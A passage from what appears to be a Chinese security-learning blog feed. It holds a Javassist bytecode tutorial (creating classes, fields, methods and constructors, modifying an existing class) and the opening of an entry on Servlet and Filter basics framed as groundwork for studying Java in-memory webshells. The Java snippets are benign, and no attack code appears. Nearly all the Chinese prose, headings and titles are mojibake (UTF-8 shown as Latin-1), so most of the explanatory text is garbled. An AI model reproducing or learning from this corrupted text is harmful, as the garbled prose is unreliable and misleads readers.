åˆ°ç±»æœç´¢è·¯å¾„ã€‚å¹¶ä¸”è¿™ä¸ªURLåªèƒ½æœç´¢`com.test`åŒ…é‡Œé¢çš„ç±»ã€‚</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡ByteArrayPathæ·»åŠ æœç´¢è·¯å¾„*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = å­—èŠ‚æ•°ç»„;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ç±»å;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡è¾“å…¥æµåŠ è½½class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  classæ–‡ä»¶å¯¹åº”çš„è¾“å…¥æµ;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1 id="è¯»å†™å­—èŠ‚ç "><a href="#è¯»å†™å­—èŠ‚ç " class="headerlink" title="è¯»å†™å­—èŠ‚ç "></a>è¯»å†™å­—èŠ‚ç </h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>çš„<code>getDefault()</code>æ–¹æ³•å°†ä¼šæŸ¥æ‰¾ç³»ç»Ÿé»˜è®¤çš„è·¯å¾„æ¥æœç´¢<code>test.Rectable</code>å¯¹è±¡ï¼Œç„¶åå°†è·å–åˆ°çš„<code>CtClass</code>å¯¹è±¡èµ‹å€¼ç»™ccå˜é‡ï¼Œå¦‚æœå¯¹è±¡æ²¡æœ‰è¢«æ‰¾åˆ°ï¼Œé‚£ä¹ˆ<code>get()</code>æ–¹æ³•å°±ä¼šåˆ›å»ºå‡ºä¸€ä¸ªé»˜è®¤çš„<code>CtClass</code>å¯¹è±¡ï¼Œç„¶åæ”¾å…¥åˆ°<code>HashTable</code>ä¸­ï¼ŒåŒæ—¶å°†å½“å‰åˆ›å»ºçš„å¯¹è±¡è¿”å›ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//ç›´æ¥è·å–å­—èŠ‚ç </span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//è·å–Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>æ–¹æ³•è°ƒç”¨ä½¿å¾—å½“å‰çº¿ç¨‹ä¸­çš„context class loaderåŠ è½½æ­¤CtClassç±»ï¼Œç„¶åç”Ÿæˆ<code>java.lang.Class</code>å¯¹è±¡ã€‚</p><h1 id="å¯¹ç±»çš„ç›¸å…³æ“ä½œ"><a href="#å¯¹ç±»çš„ç›¸å…³æ“ä½œ" class="headerlink" title="å¯¹ç±»çš„ç›¸å…³æ“ä½œ"></a>å¯¹ç±»çš„ç›¸å…³æ“ä½œ</h1><p>ä¸»è¦è¿˜æ˜¯å­¦ä¸€ä¸‹å…·ä½“çš„ä½¿ç”¨ï¼Œå¤ªæ·±å…¥çš„ä¸œè¥¿å…ˆä¸çœ‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>è¿™é‡ŒåŸºäºå‰é¢åˆ›å»ºçš„Helloç±»è¿›è¡Œæ“ä½œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2 id="æ·»åŠ å±æ€§"><a href="#æ·»åŠ å±æ€§" class="headerlink" title="æ·»åŠ å±æ€§"></a>æ·»åŠ å±æ€§</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>èµ‹å€¼ä¹Ÿå¯ä»¥è¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä½†è¿™ç§èµ‹å€¼åå‘äºç”¨æ„é€ å™¨ç­‰è¿›è¡Œåˆå§‹åŒ–</p><h2 id="æ·»åŠ æ–¹æ³•"><a href="#æ·»åŠ æ–¹æ³•" class="headerlink" title="æ·»åŠ æ–¹æ³•"></a>æ·»åŠ æ–¹æ³•</h2><p>æ–¹æ³•å¯ä»¥è®¾ç½®çš„è¿”å›ç±»å‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸æ”¯æŒç›´æ¥ç”¨Stringï¼Œæ˜¯å› ä¸ºåœ¨javaå­—èŠ‚ç ä¸­ï¼Œå‚æ•°å’Œè¿”å›ç±»å‹çš„Stringä¸€èˆ¬éƒ½æ˜¯ç”¨å¸¸é‡æ± ä¸­å­—ç¬¦ä¸²çš„ç´¢å¼•å€¼ï¼Œè¦è®¾ç½®Stringç±»å‹çš„è¯å°±å’Œå‰é¢ä¸€æ ·ç”¨<strong>classPool.getCtClass(â€œjava.lang.Stringâ€)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br><br>        <span class="hljs-comment">//3.æ·»åŠ æ–¹æ³•</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯è¿”å›ç±»å‹ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ï¼Œè¦æ·»åŠ çš„æ–¹æ³•çš„CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä¸ºpublic</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3 id="è®¾ç½®æ–¹æ³•ä½“"><a href="#è®¾ç½®æ–¹æ³•ä½“" class="headerlink" title="è®¾ç½®æ–¹æ³•ä½“"></a>è®¾ç½®æ–¹æ³•ä½“</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.æ·»åŠ æ–¹æ³•</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯è¿”å›ç±»å‹ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ï¼Œè¦æ·»åŠ çš„æ–¹æ³•çš„CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä¸ºpublic</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.è®¾ç½®æ–¹æ³•ä½“</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3 id="æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç "><a href="#æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç " class="headerlink" title="æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç "></a>æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘åœ¨å‰é¢æ’å…¥:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘åœ¨åé¢æ’å…¥äº†:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2 id="æ·»åŠ æ„é€ å™¨"><a href="#æ·»åŠ æ„é€ å™¨" class="headerlink" title="æ·»åŠ æ„é€ å™¨"></a>æ·»åŠ æ„é€ å™¨</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯å‚æ•°åˆ—è¡¨ï¼Œè¦æ·»åŠ çš„CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span class="hljs-comment">//è®¾ç½®name=var1ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>æ— å‚æ„é€ å»æ‰ä¸­é—´çš„å‚æ•°å³å¯</p></blockquote><h2 id="ä¿®æ”¹å·²æœ‰ç±»"><a href="#ä¿®æ”¹å·²æœ‰ç±»" class="headerlink" title="ä¿®æ”¹å·²æœ‰ç±»"></a>ä¿®æ”¹å·²æœ‰ç±»</h2><p>ç”¨ClassPoolè·å–CtClassä¹‹åè¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬å¯¹æˆ‘ä»¬æˆ‘ä»¬å‰é¢åˆ›å»ºçš„Hello.classè¿›è¡Œä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//å¯¹å·²æœ‰ç±»è¿›è¡Œä¿®æ”¹</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¿®æ”¹</p><blockquote><p>è¿™é‡Œæ·»åŠ ç±»è·¯å¾„çš„æ—¶å€™è¦æ³¨æ„åœ¨åŒ…åçš„ä¸Šä¸€å±‚ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°ç±»ï¼Œå› ä¸ºgetçš„æ—¶å€™ç”¨å®Œæ•´åŒ…åä¼šè‡ªåŠ¨æ·»åŠ ä¸Šè·¯å¾„è¿›è¡Œæœç´¢</p><p>æ¯”å¦‚ä¸Šé¢çš„æ·»åŠ è·¯å¾„ä¸ºï¼šD:\CTF\Java\JavaCode\JavassistLearnï¼Œæœç´¢æ—¶å°±æ˜¯è¿™æ ·ï¼šD:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1 id="ä¸€äº›ç‰¹æ®Šå˜é‡"><a href="#ä¸€äº›ç‰¹æ®Šå˜é‡" class="headerlink" title="ä¸€äº›ç‰¹æ®Šå˜é‡"></a>ä¸€äº›ç‰¹æ®Šå˜é‡</h1><p>å°±æ˜¯æˆ‘ä»¬å‰é¢ä½¿ç”¨çš„$1ï¼Œ$0é‚£äº›</p><table><thead><tr><th>æ ‡è¯†ç¬¦</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>$0ã€$1ã€$2ã€ $3ç­‰</td><td>thiså’Œæ–¹æ³•å‚æ•°ï¼ˆ1-Næ˜¯æ–¹æ³•å‚æ•°çš„é¡ºåºï¼‰</td></tr><tr><td>$args</td><td>æ–¹æ³•å‚æ•°æ•°ç»„ï¼Œç±»å‹ä¸ºObject[]</td></tr><tr><td>$$</td><td>æ‰€æœ‰æ–¹æ³•å‚æ•°ï¼Œä¾‹å¦‚ï¼šm($$)ç›¸å½“äºm($1,$2,â€¦)</td></tr><tr><td>$cflow(â€¦)</td><td>control flow å˜é‡</td></tr><tr><td>$r</td><td>è¿”å›ç»“æœçš„ç±»å‹ï¼Œåœ¨å¼ºåˆ¶è½¬æ¢è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</td></tr><tr><td>$w</td><td>åŒ…è£…å™¨ç±»å‹ï¼Œåœ¨å¼ºåˆ¶è½¬æ¢è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</td></tr><tr><td>$_</td><td>æ–¹æ³•çš„è¿”å›å€¼</td></tr><tr><td>$sig</td><td>ç±»å‹ä¸ºjava.lang.Classçš„å‚æ•°ç±»å‹å¯¹è±¡æ•°ç»„</td></tr><tr><td>$type</td><td>ç±»å‹ä¸ºjava.lang.Classçš„è¿”å›å€¼ç±»å‹</td></tr><tr><td>$class</td><td>ç±»å‹ä¸ºjava.lang.Classçš„æ­£åœ¨ä¿®æ”¹çš„ç±»</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> javaåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…å­˜é©¬å‰ç½®å­¦ä¹ </title>
      <link href="/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å­¦å†…å­˜é©¬å‰å°±è¦æ¥å­¦ä¸€å­¦java webä¸‰å¤§ä»¶çš„ç›¸å…³åŸç†ï¼šServletã€Filterã€Listener</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/jadite/p/16951328.html">https://www.cnblogs.com/jadite/p/16951328.html</a></p><h1 id="servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="servletæ˜¯ä»€ä¹ˆ"><a href="#Servletæ˜¯ä»€ä¹ˆ" class="headerlink" title="Servletæ˜¯ä»€ä¹ˆ"></a>Servletæ˜¯ä»€ä¹ˆ</h2><p>Servletæ˜¯JavaEEè§„èŒƒï¼ˆæ¥å£ï¼‰ä¹‹ä¸€ï¼›<br>Servletæ˜¯è¿è¡Œåœ¨æœåŠ¡å™¨(Webå®¹å™¨Tomcatç­‰)ä¸Šçš„ä¸€ä¸ª java å°ç¨‹åºï¼Œå®ƒç”¨æ¥æ¥æ”¶å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œå¹¶å“åº”æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚<br>ServletåŠç›¸å¯¹çš„å¯¹è±¡ï¼Œéƒ½ç”±Tomcatåˆ›å»ºï¼Œæˆ‘ä»¬åªæ˜¯ä½¿ç”¨ã€‚</p><blockquote><p>Tomcatå°±æ˜¯ä¸€ä¸ªservletå®¹å™¨</p></blockquote><p>Servletéœ€è¦å®Œæˆ3ä¸ªä»»åŠ¡ï¼š</p><ol><li>æ¥æ”¶è¯·æ±‚ï¼šå°†å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚å°è£…æˆServletRequestå¯¹è±¡ï¼ˆåŒ…å«è¯·æ±‚å¤´ã€å‚æ•°ç­‰å„ç§ä¿¡æ¯ï¼‰</li><li>å¤„ç†è¯·æ±‚ï¼šåœ¨serviceæ–¹æ³•ä¸­æ¥æ”¶å‚æ•°ï¼Œå¹¶ä¸”è¿›è¡Œå¤„ç†è¯·æ±‚ã€‚</li><li>æ•°æ®å“åº”ï¼šè¯·æ±‚å¤„ç†å®Œæˆåï¼Œé€šè¿‡è½¬å‘ï¼ˆforwardï¼‰æˆ–è€…é‡å®šå‘ï¼ˆredirectï¼‰åˆ°æŸä¸ªé¡µé¢ã€‚</li></ol><p><strong>Servletç¨‹åºå®ç°</strong></p><ol><li>å®ç°Servletæ¥å£ï¼Œé‡æ–°serviceæ–¹æ³•</li><li>åœ¨web.xmlæˆ–è€…ç”¨æ³¨è§£é…ç½®æ˜ å°„</li></ol><h2 id="servletç”Ÿå‘½å‘¨æœŸ"><a href="#Servletç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Servletç”Ÿå‘½å‘¨æœŸ"></a>Servletç”Ÿå‘½å‘¨æœŸ</h2><ol><li>æ‰§è¡Œ Servlet æ„é€ å™¨æ–¹æ³•<br>ç¬¬ä¸€æ­¥ï¼Œåœ¨web.xmlä¸­çš„servletä¸­é…ç½® load-on-startup çš„å€¼ â‰¥ 0 æ—¶ï¼Œè¡¨ç¤ºåº”ç”¨å¯åŠ¨æ—¶å°±åˆ›å»ºè¿™ä¸ªservletã€‚å¦åˆ™ï¼Œç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™è°ƒç”¨ã€‚</li><li>æ‰§è¡Œ init åˆå§‹åŒ–æ–¹æ³•<br>ç¬¬äºŒæ­¥ï¼Œç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™è°ƒç”¨ã€‚</li><li>æ‰§è¡Œ service æ–¹æ³•<br>ç¬¬ä¸‰æ­¥ï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šè°ƒç”¨ã€‚</li><li>æ‰§è¡Œ destroy é”€æ¯æ–¹æ³•<br>ç¬¬å››æ­¥ï¼Œåœ¨ web å·¥ç¨‹åœæ­¢çš„æ—¶å€™è°ƒç”¨ã€‚</li></ol><h2 id="servletconfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h2><p>å®ƒæ˜¯Servletç¨‹åºçš„é…ç½®ä¿¡æ¯ç±»</p><p><strong>å®ƒçš„ä¸‰å¤§ä½œç”¨ï¼š</strong></p><ol><li>è·å–web.xml ä¸­ Servlet ç¨‹åºçš„åˆ«å servlet-name çš„å€¼</li><li>è·å–web.xml ä¸­ Servlet ç¨‹åºçš„è·å–åˆå§‹åŒ–å‚æ•° init-param</li><li>è·å– ServletContext å¯¹è±¡</li></ol><p><strong>ServletConfig</strong></p><ol><li>æ¯ä¸ªwebé¡¹ç›®åªæœ‰ä¸€ä¸ªServletContextå¯¹è±¡ï¼Œåœ¨webå·¥ç¨‹éƒ¨ç½²å¯åŠ¨çš„æ—¶å€™åˆ›å»ºï¼Œåœ¨å·¥ç¨‹åœæ­¢çš„æ—¶å€™å…³é—­ã€‚</li><li>ServletContext å¯¹è±¡æ˜¯ä¸€ä¸ªåŸŸå¯¹è±¡ï¼ˆå¯ä»¥åƒMapä¸€æ ·å­˜å‚¨æ•°æ®çš„å¯¹è±¡ã€‚åŸŸæŒ‡çš„æ˜¯ä½œç”¨åŸŸï¼Œè¿™é‡Œæ˜¯æ•´ä¸ªwebå·¥ç¨‹ï¼‰ã€‚</li></ol><p><strong>ServletContext ç±»çš„å››ä¸ªä½œç”¨ï¼š</strong></p><ol><li>è·å– web.xml ä¸­é…ç½®çš„ä¸Šä¸‹æ–‡å‚æ•° context-param</li><li>getContextPath()è·å–å½“å‰çš„å·¥ç¨‹è·¯å¾„ï¼Œæ ¼å¼: &#x2F;å·¥ç¨‹è·¯å¾„</li><li>getRealPath()è·å–å·¥ç¨‹éƒ¨ç½²ååœ¨æœåŠ¡å™¨ç¡¬ç›˜ä¸Šçš„ç»å¯¹è·¯å¾„</li><li>åƒ Map ä¸€æ ·å­˜å–æ•°æ®</li></ol><p><strong>HttpServletRequestå’ŒHttpServletResponse</strong></p><p>HttpServletResponseç»§æ‰¿äº†ServletRequestï¼ŒHttpServletResponseç»§æ‰¿äº†ServletResponseï¼Œä»–ä»¬ä¸¤ä¸ªéƒ½æ˜¯æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨doGetæˆ–è€…doPostçš„æ—¶å€™ä¼ å…¥çš„è‚¯å®šæ˜¯ä»–ä»¬çš„å®ç°ç±»ï¼Œè€Œè¿™ä¸ªå®ç°ç±»æ˜¯ç”±tomcatåˆ›å»ºçš„ï¼Œå°è£…äº†è¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯ï¼Œåˆ°ä¸‹é¢è®²tomcatçš„æ—¶å€™å†ä¸²èµ·æ¥ç»†è¯´ã€‚</p><h1 id="filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filter æ˜¯JavaEEè§„èŒƒï¼ˆæ¥å£ï¼‰ä¹‹ä¸€ï¼›<br>Filter 